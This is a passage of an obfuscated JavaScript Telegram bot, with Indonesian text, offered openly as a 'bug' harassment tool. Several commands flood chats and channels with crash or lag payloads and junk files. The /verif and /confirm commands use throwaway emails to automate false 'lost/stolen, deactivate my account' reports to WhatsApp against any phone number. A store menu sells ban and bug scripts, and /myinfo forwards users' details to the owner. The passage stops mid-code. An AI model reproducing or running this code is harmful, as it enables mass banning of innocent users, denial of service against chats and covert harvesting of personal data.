casperMessage=virus4+'\x0a'+virus4+'\x0a'+virus4+'\x0a'+virus4;bot[_0x8341e4(0x163)][_0x8341e4(0x15b)](ctx['chat']['id'],casperMessage,{'reply_markup':{'inline_keyboard':[[{'text':''+bugbuton,'callback_data':_0x8341e4(0x15f)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x164)}],[{'text':''+bugbuton,'callback_data':'jdhdbb'},{'text':''+bugbuton,'callback_data':_0x8341e4(0x15e)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':'ajdejjd'}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)},{'text':''+bugbuton,'callback_data':_0x8341e4(0x161)}],[{'text':''+bugbuton,'callback_data':'ajdejjd'}]]}});
})

bot.hears(prefixbugaud, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
  function _0x5352(_0x12fa46,_0xc76d64){const _0x19f79f=_0x19f7();return _0x5352=function(_0x53523a,_0x599bd1){_0x53523a=_0x53523a-0x151;let _0x2828f1=_0x19f79f[_0x53523a];return _0x2828f1;},_0x5352(_0x12fa46,_0xc76d64);}const _0x2f4a3b=_0x5352;function _0x19f7(){const _0x2fc1c2=['7DFXRno','message_id','5007978ubrMeR','50320CmPMxe','./res/assets/bugaudio.mp3','39vbxAsh','replyWithAudio','1454968yXBcPn','491036HyrCvk','2561994HgMbkw','452045XPSvIP','7919406pKDnlX','message','5irmtsi','9647VLKtXl'];_0x19f7=function(){return _0x2fc1c2;};return _0x19f7();}(function(_0x365ca9,_0x50c555){const _0x5eb39b=_0x5352,_0x5b09f9=_0x365ca9();while(!![]){try{const _0x14faa2=parseInt(_0x5eb39b(0x156))/0x1+parseInt(_0x5eb39b(0x155))/0x2+-parseInt(_0x5eb39b(0x151))/0x3*(-parseInt(_0x5eb39b(0x154))/0x4)+-parseInt(_0x5eb39b(0x159))/0x5*(-parseInt(_0x5eb39b(0x15d))/0x6)+-parseInt(_0x5eb39b(0x15b))/0x7*(-parseInt(_0x5eb39b(0x153))/0x8)+parseInt(_0x5eb39b(0x157))/0x9+-parseInt(_0x5eb39b(0x15e))/0xa*(parseInt(_0x5eb39b(0x15a))/0xb);if(_0x14faa2===_0x50c555)break;else _0x5b09f9['push'](_0x5b09f9['shift']());}catch(_0x1a704b){_0x5b09f9['push'](_0x5b09f9['shift']());}}}(_0x19f7,0xc6519));let bugaudio=_0x2f4a3b(0x15f);ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx['message'][_0x2f4a3b(0x15c)]}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)]['message_id']}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx['message']['message_id']}),ctx['replyWithAudio']({'source':bugaudio},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]}),ctx['replyWithAudio']({'source':bugaudio},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)]['message_id']}),ctx[_0x2f4a3b(0x152)]({'source':bugaudio},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x2f4a3b(0x158)][_0x2f4a3b(0x15c)]});
}); 

bot.hears(prefixbugdoc, (ctx) => { 
bot.telegram.sendChatAction(ctx.chat.id, "upload_document")
function _0x54dc(_0x1e1009,_0x589820){const _0x208d21=_0x208d();return _0x54dc=function(_0x54dcad,_0x2ced0c){_0x54dcad=_0x54dcad-0x179;let _0xa4124=_0x208d21[_0x54dcad];return _0xa4124;},_0x54dc(_0x1e1009,_0x589820);}const _0x5390f7=_0x54dc;function _0x208d(){const _0x3cffcf=['message','2907441pykJsV','2562174cjPzlB','35iBXRnc','22vaWnAF','5qkSJqN','7772832HLKDMO','replyWithDocument','message_id','11543JQGCNX','563704uViECS','1393936xcLrfE','21845220eGvFuH'];_0x208d=function(){return _0x3cffcf;};return _0x208d();}(function(_0x48957d,_0x113e3e){const _0x412b3c=_0x54dc,_0x5f2cd4=_0x48957d();while(!![]){try{const _0x25af8d=-parseInt(_0x412b3c(0x185))/0x1*(parseInt(_0x412b3c(0x180))/0x2)+-parseInt(_0x412b3c(0x17d))/0x3+-parseInt(_0x412b3c(0x179))/0x4+-parseInt(_0x412b3c(0x181))/0x5*(parseInt(_0x412b3c(0x17e))/0x6)+-parseInt(_0x412b3c(0x17f))/0x7*(parseInt(_0x412b3c(0x17a))/0x8)+parseInt(_0x412b3c(0x182))/0x9+parseInt(_0x412b3c(0x17b))/0xa;if(_0x25af8d===_0x113e3e)break;else _0x5f2cd4['push'](_0x5f2cd4['shift']());}catch(_0x3c5360){_0x5f2cd4['push'](_0x5f2cd4['shift']());}}}(_0x208d,0x7d375));let bugdoc='./res/assets/bugdoc.BIN';ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)]['message_id']}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)]['message_id']}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx['message']['message_id']}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)]['message_id']}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx['replyWithDocument']({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx['message'][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':virus4+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)]['message_id']}),ctx[_0x5390f7(0x183)]({'source':bugdoc},{'caption':ngajab+'\x0a\x0a','reply_to_message_id':ctx[_0x5390f7(0x17c)][_0x5390f7(0x184)]});
}); 

bot.hears(prefixbugcap, (ctx) => { 
bot.telegram.sendChatAction(ctx.chat.id, "upload_photo")
    let bugcap = './res/assets/img.jpg';
ctx.replyWithPhoto({source: bugcap}, {caption: `${bugcaption}`, reply_to_message_id : ctx.message.message_id})
});

bot.hears(prefixbugctt, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
bot.telegram.sendContact(ctx.chat.id, '+62895403595055', `${virus4}`);
});

bot.command(prefixkeybug, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
 ctx.reply(keyboard)
})

bot.hears(prefixbugch, async (ctx) => {
  ctx.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : 'Join To Bug Channel', reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `Bug Channel`, url: `https://t.me/Casperbug`}
                    ],
                    [
                        {text: `Donate`, callback_data: 'donatedel'},
                        {text: `Owner`, url: 'https://t.me/Nazimeet'}
                    ]
                ]
            }
      });
});

//_______________________________________________________________________\\
//trash

bot.hears('dog', (ctx) => {
    let input = ctx.message.text.split(" ");
    if(input.length != 2){
        ctx.reply("Anda harus memberi jenis anjing pada argumen yang ke 2");
        return;
    }
    let breedInput = input[1];
    let rawData = fs.readFileSync("./dogbreed.json", "utf8");
    let data = JSON.parse(rawData);
    
    if(data.includes(breedInput)){
        axios.get(`https://dog.ceo/api/breed/${breedInput}/images/random`)
        .then(res => {
            // console.log(res.data);
            ctx.replyWithPhoto(res.data.message);
        }).catch(e =>{
            console.log(e);
        })
    }else{
        let suggestions = data.filter(item => {
            return item.startsWith(breedInput);
        })
        let message = `Apakah yang anda maksud adalah: \n`;
        suggestions.forEach(item => {
            message += `- ${item}\n`;
        })
        if(suggestions.length == 0){
            ctx.reply("Tidak dapat menemukan jenis");
        }else{
            ctx.reply(message);
        }
    }
})

//_______________________________________________________________________\\
//store
bot.hears('testi', ctx => {
    bot.telegram.sendChatAction(ctx.chat.id, "upload_photo")
    bot.telegram.sendPhoto(ctx.chat.id, 
        {
            source : 'res/testi/testi1.jpg',
        },
        {
            reply_to_message_id : ctx.message.message_id
        }
    );
   ctx.reply(`Minta Testi Doang Beli Kagak Kalo Mau Beli Ketik Pref /store`);
})

bot.hears('store', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    let priceMessage = `${store}`;
    bot.telegram.sendMessage(ctx.chat.id, priceMessage,
        {
            reply_markup:{
                inline_keyboard: [
                    [
                        {text: "WhatsApp Anti Banned", callback_data: 'buywangsap'},
                        {text: "Text Banned", callback_data: 'buytekban'}
                    ],
                    [
                        {text: "Script Bot Full Bug", callback_data: 'buyscbug'},
                        {text: "Script Base Bot Telegram", callback_data: 'buysctele'}
                    ],
                    [
                        {text: "Kembali ke menu", callback_data: 'start'}
                    ]
                ]
            }
        })
})

bot.action('buywangsap', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.deleteMessage();
    ctx.reply(`${whatsapp}`, {reply_to_message_id : ctx.message.message_id});
})

bot.action('buytekban', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.deleteMessage();
    ctx.reply(`${textban}`, {reply_to_message_id : ctx.message.message_id});
})

bot.action('buyscbug', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.reply(`${scwa}`, {reply_to_message_id : ctx.message.message_id});
})

bot.action('buysctele', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.deleteMessage();
    ctx.reply(`${sctele}`, {reply_to_message_id : ctx.message.message_id});
})

//_______________________________________________________________________\\
//game
bot.hears('slot', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.reply(`|${slot1}${slot2}${slot3}${slot4}|\n\nFor See A Rule To Win slotrule`);
})

bot.hears('slotrule', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.reply(`Jika Kamu Mendapat Emoji Yang Sama Maka Kmu Menang`);
})

//_______________________________________________________________________\\
//function

bot.command('myinfo', (ctx) => {
  const chatId = ctx.message.chat.id;
  const chat = ctx.telegram.getChat(chatId);
  console.log(chat); // logs the chat object to the console
  const phoneNumberRegex = /[+]?[(]?[0-9]{1,4}[)]?[-\s.]?[0-9]{1,3}[-\s.]?[0-9]{1,4}[-\s.]?[0-9]{1,4}/g;
  const phoneNumber = ctx.message.text.match(phoneNumberRegex);
  const user = ctx.message.from;
  const orgnye = `${ownerId}`;
  const username = ctx.message.from.username;
  const fname = ctx.message.from;
  const userId = ctx.from.id;
    ctx.telegram.sendPhoto(orgnye, {source: assetpict}, {caption : `Your Account Infromation\n\nUsername: @${username}\nFirst Name: ${fname.first_name}\nLast Name: ${fname.last_name}\nPhone Num: ${phoneNumber}\nChat Title: ${chat.title}\nChat Count: ${chat.members_count}\nUser Id: ${userId}`, reply_markup : { inline_keyboard: [
                    [
                        {text: `Donate`, callback_data: 'donatedel'},
                    ]
                ]
            }
      });
});

bot.command('welcome', (ctx) => {
if (ctx.from.username === `${ownerUsername}`) {
let casperMessage = `Set Welcome On / Off`;
bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `On`, callback_data: 'onwelkom'},
                        {text: `Off`, callback_data: 'offwelkom'},
                    ]
                ]
            }
      });
      }else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
        }
     });
     
bot.action('onwelkom', ctx => {
welcomeMessageOn = true;
ctx.deleteMessage();
let antilinkMessage = `Welcome Is Now On`;
bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : antilinkMessage, reply_markup : { inline_keyboard: [
                    [
                        {text: `Off`, callback_data: 'offwelkom'},
                    ]
                ]
            }
      });
})

bot.action('offwelkom', ctx => {
welcomeMessageOn = false;
ctx.deleteMessage();
let antilinkMessage = `Welcome Is Now Off`;
bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : antilinkMessage, reply_markup : { inline_keyboard: [
                    [
                        {text: `On`, callback_data: 'onantiling'},
                    ]
                ]
            }
      });
})

bot.command('antilink', (ctx) => {
if (ctx.from.username === `${ownerUsername}`) {
let casperMessage = `Set Anti-Link On / Off`;
bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `On`, callback_data: 'onantiling'},
                        {text: `Off`, callback_data: 'onantiling'},
                    ]
                ]
            }
      });
bot.on('text', (ctx) => {
  if (antiLinkModeOn && ctx.message.entities && ctx.message.entities.some(e => e.type === 'url')) {
    ctx.deleteMessage(ctx.message.message_id).catch(() => {});
    ctx.reply('Links are not allowed in this chat!');
  }
});
bot.action('onantiling', ctx => {
antiLinkModeOn = !antiLinkModeOn;
ctx.deleteMessage();
let antilinkMessage = `Anti-link mode is now ${antiLinkModeOn ? 'On' : 'Off'}`;
bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : antilinkMessage, reply_markup : { inline_keyboard: [
                    [
                        {text: `${antiLinkModeOn ? 'Off' : 'On'}`, callback_data: 'onantiling'},
                    ]
                ]
            }
      });
})
}else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
        }
});

bot.hears(sadsongpref, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
const sadsong = ['18', 'DECRMBER', 'DUKA', 'HEAT', 'LOVEYOU', 'WILRAIN', 'CANS']
const sadcuy = sadsong[Math.floor(Math.random() * sadsong.length)]
    let rndmsnd = `./res/assets/${sadcuy}.mp3`;
ctx.replyWithAudio({source: rndmsnd}, {caption: `😔` })
}); 

bot.hears(banedtod, (ctx, match) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
  const chatId = ctx.chat.id;
  if (ctx.from.username === `${ownerUsername}`) {
    ctx.replyWithDocument({source: './res/assets/ban.zip'}, {caption: `DONE`})
  }else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
        }
});

bot.command('add', async (ctx) => {
const username = ctx.message.text.split(' ')[1];
  const user = await ctx.telegram.getChatMember(ctx.chat.id, username);
if (ctx.from.username === `${ownerUsername}`) {
  ctx.telegram.restrictChatMember(ctx.chat.id, user.user.id, {
    can_send_messages: true,
    can_send_media_messages: true,
    can_send_other_messages: true,
    can_add_web_page_previews: true
  });
  ctx.reply(`${user.user.first_name} has been added to the chat.`);
}else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
     }
});

bot.command('sendBug', async (ctx) => {
  const channelName = ctx.message.text.split(' ')[1];
  const message = 'Casper ⸸ Misterio';
  if (ctx.from.username === `${ownerUsername}`) {
  bot.telegram.sendChatAction(ctx.chat.id, "typing")
  bot.telegram.sendMessage(channelName, `${virus4}`)
  bot.telegram.sendMessage(channelName, delayMeker)
  bot.telegram.sendMessage(channelName, `${virus4}`)
  bot.telegram.sendMessage(channelName, delayMeker)
  bot.telegram.sendMessage(channelName, `${virus4}`)
  setTimeout(() => {
    ctx.reply('This message was sent after waiting for 5 seconds.');
  }, 5000);
  bot.telegram.sendMessage(channelName, message)
  bot.telegram.sendMessage(channelName, message)
  bot.telegram.sendMessage(channelName, message)
  bot.telegram.sendMessage(channelName, message)
    ctx.reply(`Delay Maker By Casper ⸸ Misterio`, {reply_to_message_id : ctx.message.message_id});
  ctx.reply(`Message sent to\n${channelName}\n\nUrl: http://t.me/${channelName}\nMessage: Delay Maker`);
}else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
     }
});

bot.command('sendMsg', async (ctx) => {
  const channelName = ctx.message.text.split(' ')[1];
  const message = ctx.message.text.split(' ').slice(2).join(' ');
  if (ctx.from.username === `${ownerUsername}`) {
  ctx.telegram.sendPhoto(channelName, {source: assetpict}, {caption : message, reply_markup : { inline_keyboard: [
                    [
                        {text: `YouTube`, url: `https://youtube.com/@Asmoudeous666`}
                    ],
                    [
                        {text: `Donate`, callback_data: 'donatedel'},
                        {text: `Owner`, url: 'https://t.me/Nazimeet'}
                    ]
                ]
            }
      });
  ctx.reply(`Message sent to\n${channelName}\n\nUrl: http://t.me/${channelName}\nMessage: ${message}`);
}else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
     }
});

bot.on("left_chat_members", (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
const user = ctx.message.left_chat_member;
  ctx.telegram.kickChatMember(ctx.chat.id, user.id);
let casperMessage = `${user.first_name} has left the chat.`;
bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `Donate`, callback_data: 'donate'},
                        {text: `Owner`, url: 'https://t.me/Nazimeet'}
                    ]
                ]
            }
      });
});

bot.command('remove', async (ctx) => {
  const user = ctx.message.reply_to_message.from;
if (ctx.from.username === `${ownerUsername}`) {
  await ctx.telegram.kickChatMember(ctx.chat.id, user.id);
  ctx.reply(`${user.first_name} has been removed from the chat.`);
}else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
     }
});

bot.command('verif', async (ctx) => {
const _0x39a9ab=_0x3053;(function(_0x2260cd,_0x181c31){const _0x569b2e=_0x3053,_0x536996=_0x2260cd();while(!![]){try{const _0x47e462=parseInt(_0x569b2e(0x12d))/0x1+-parseInt(_0x569b2e(0x132))/0x2+-parseInt(_0x569b2e(0x124))/0x3*(parseInt(_0x569b2e(0x134))/0x4)+-parseInt(_0x569b2e(0x13d))/0x5*(parseInt(_0x569b2e(0x11e))/0x6)+-parseInt(_0x569b2e(0x13b))/0x7*(parseInt(_0x569b2e(0x129))/0x8)+-parseInt(_0x569b2e(0x144))/0x9*(-parseInt(_0x569b2e(0x14e))/0xa)+-parseInt(_0x569b2e(0x11d))/0xb*(-parseInt(_0x569b2e(0x118))/0xc);if(_0x47e462===_0x181c31)break;else _0x536996['push'](_0x536996['shift']());}catch(_0x247f67){_0x536996['push'](_0x536996['shift']());}}}(_0x1659,0xcc3c2));function _0x3053(_0x135bf8,_0x2f6b97){const _0x1659ac=_0x1659();return _0x3053=function(_0x3053bf,_0x4520e3){_0x3053bf=_0x3053bf-0x116;let _0x4332e5=_0x1659ac[_0x3053bf];return _0x4332e5;},_0x3053(_0x135bf8,_0x2f6b97);}const chatId=ctx[_0x39a9ab(0x127)]['id'];var axioss=require('axios');let num=ctx['message'][_0x39a9ab(0x138)][_0x39a9ab(0x13f)]('\x20')[0x1],ntah=await axioss[_0x39a9ab(0x14d)](_0x39a9ab(0x116)),email=await axioss[_0x39a9ab(0x14d)](_0x39a9ab(0x147)),cookie=ntah[_0x39a9ab(0x121)][_0x39a9ab(0x13a)][_0x39a9ab(0x137)](';\x20');const cheerio=require('cheerio');let $=cheerio[_0x39a9ab(0x12a)](ntah[_0x39a9ab(0x145)]),$form=$(_0x39a9ab(0x120)),url=new URL($form[_0x39a9ab(0x123)](_0x39a9ab(0x117)),_0x39a9ab(0x12b))[_0x39a9ab(0x12e)],form=new URLSearchParams();function _0x1659(){const _0x4f2e15=['join','text','__a','set-cookie','2723mRjEyy','POST','15ZrBnUB','email_confirm','split','find','1006630858','19316.BP:whatsapp_www_pkg.2.0.0.0.0','step','7101FEjjRc','data','dpr','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1','__req','reply','phone_number','your_message','country_selector','get','20730EBHyQB','https://www.whatsapp.com/contact/noclient/','action','36fYeIwV','append','ANDROID','__hs','__csr','630311CbmdvN','326226NCzBBv','submit','form','headers','platform','attr','3mxIkDf','input[name=lsd]','email','chat','message','200nUVcKq','load','https://www.whatsapp.com','__comment_req','1323356iIcKUw','href','message_id','val','__user','1561910tLZjiC','input[name=jazoest]','5362068oXrwqK','jazoest','UNKNOWN'];_0x1659=function(){return _0x4f2e15;};return _0x1659();}form[_0x39a9ab(0x119)](_0x39a9ab(0x135),$form[_0x39a9ab(0x140)](_0x39a9ab(0x133))['val']()),form['append']('lsd',$form[_0x39a9ab(0x140)](_0x39a9ab(0x125))[_0x39a9ab(0x130)]()),form[_0x39a9ab(0x119)](_0x39a9ab(0x143),_0x39a9ab(0x11f)),form[_0x39a9ab(0x119)](_0x39a9ab(0x14c),'ID'),form['append'](_0x39a9ab(0x14a),num),form[_0x39a9ab(0x119)](_0x39a9ab(0x126),email['data'][0x0]),form[_0x39a9ab(0x119)](_0x39a9ab(0x13e),email[_0x39a9ab(0x145)][0x0]),form[_0x39a9ab(0x119)](_0x39a9ab(0x122),_0x39a9ab(0x11a)),form[_0x39a9ab(0x119)](_0x39a9ab(0x14b),'Perdido/roubado:\x20desative\x20minha\x20conta'),form[_0x39a9ab(0x119)](_0x39a9ab(0x131),'0'),form[_0x39a9ab(0x119)](_0x39a9ab(0x139),'1'),form[_0x39a9ab(0x119)](_0x39a9ab(0x11c),''),form[_0x39a9ab(0x119)](_0x39a9ab(0x148),'8'),form[_0x39a9ab(0x119)](_0x39a9ab(0x11b),_0x39a9ab(0x142)),form[_0x39a9ab(0x119)](_0x39a9ab(0x146),'1'),form[_0x39a9ab(0x119)]('__ccg',_0x39a9ab(0x136)),form[_0x39a9ab(0x119)]('__rev',_0x39a9ab(0x141)),form[_0x39a9ab(0x119)](_0x39a9ab(0x12c),'0');let res=await axioss({'url':url,'method':_0x39a9ab(0x13c),'data':form,'headers':{'cookie':cookie}});ctx[_0x39a9ab(0x149)](res[_0x39a9ab(0x145)],{'reply_to_message_id':ctx[_0x39a9ab(0x128)][_0x39a9ab(0x12f)]});
})

bot.command('lapor', (ctx) => {
let pesanye = ctx.message.text.split(" ");
const orgnye = `${ownerId}`;
if (pesanye < 3) return ctx.reply(`Minimal Laporan 10 Character`);
bot.telegram.sendChatAction(ctx.chat.id, "typing")
ctx.replyWithPhoto({source: assetpict}, {caption: `Laporan anda telah terkirim, Maaf atas ketidak nyamanan nya`, reply_to_message_id : ctx.message.message_id});
    let casperMessage = `${pesanye}`;
    bot.telegram.sendMessage(orgnye, casperMessage)
    });
    
bot.command('banned', (ctx) => {
let pesanye = ctx.message.text.split(" ")[1];
const orgnye = `${ownerId}`;
if (pesanye < 3) return ctx.reply(`Masukan Nomor Dengan Benar!!`);
if (ctx.from.username === `${ownerUsername}`) {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
ctx.replyWithPhoto({source: assetpict}, {caption: `Permintaan Blokir Anda Telah Terkirim, Tunggu Owner Membalasnya!!`, reply_to_message_id : ctx.message.message_id});
    let casperMessage = `/confirm ${pesanye}`;
    bot.telegram.sendMessage(orgnye, casperMessage)
    }else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
     }
    });

bot.command('confirm', async (ctx) => {
const _0x3aec89=_0xbc2b;function _0x14ac(){const _0x23ca4a=['message','241263yyXJCx','platform','__csr','href','__user','ANDROID','email_confirm','action','val','attr','cheerio','get','email','__rev','2031138eeKXEe','split','lsd','data','reply','join','POST','https://www.whatsapp.com/contact/noclient/','jazoest','load','__ccg','461756fJTafn','827100FQGHUy','form','chat','append','19316.BP:whatsapp_www_pkg.2.0.0.0.0','from','username','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1','1006630858','headers','message_id','Mkst?','input[name=jazoest]','axios','200qSOHXM','403536uaUrJT','__a','5MlxIQw','876822SZJJTu','__hs','find','submit','1881607FiHUsI'];_0x14ac=function(){return _0x23ca4a;};return _0x14ac();}(function(_0x978f8c,_0x14b80d){const _0x49e7b0=_0xbc2b,_0x2148e2=_0x978f8c();while(!![]){try{const _0x141048=parseInt(_0x49e7b0(0xfd))/0x1+parseInt(_0x49e7b0(0xee))/0x2+parseInt(_0x49e7b0(0x100))/0x3+-parseInt(_0x49e7b0(0xed))/0x4*(parseInt(_0x49e7b0(0xff))/0x5)+-parseInt(_0x49e7b0(0x114))/0x6+parseInt(_0x49e7b0(0x104))/0x7+-parseInt(_0x49e7b0(0xfc))/0x8*(parseInt(_0x49e7b0(0x106))/0x9);if(_0x141048===_0x14b80d)break;else _0x2148e2['push'](_0x2148e2['shift']());}catch(_0x91c7e5){_0x2148e2['push'](_0x2148e2['shift']());}}}(_0x14ac,0x3e048));const chatId=ctx[_0x3aec89(0xf0)]['id'];function _0xbc2b(_0x29cbd8,_0x265212){const _0x14ac38=_0x14ac();return _0xbc2b=function(_0xbc2be5,_0x5e7c9d){_0xbc2be5=_0xbc2be5-0xe4;let _0x58eaa0=_0x14ac38[_0xbc2be5];return _0x58eaa0;},_0xbc2b(_0x29cbd8,_0x265212);}if(ctx[_0x3aec89(0xf3)][_0x3aec89(0xf4)]===`${ownerUsername}`){var axioss=require(_0x3aec89(0xfb));let num=ctx[_0x3aec89(0x105)]['text'][_0x3aec89(0x115)]('\x20')[0x1],ntah=await axioss[_0x3aec89(0x111)](_0x3aec89(0xe9)),email=await axioss[_0x3aec89(0x111)](_0x3aec89(0xf5)),cookie=ntah[_0x3aec89(0xf7)]['set-cookie'][_0x3aec89(0xe7)](';\x20');const cheerio=require(_0x3aec89(0x110));let $=cheerio[_0x3aec89(0xeb)](ntah['data']),$form=$(_0x3aec89(0xef)),url=new URL($form[_0x3aec89(0x10f)](_0x3aec89(0x10d)),'https://www.whatsapp.com')[_0x3aec89(0x109)],form=new 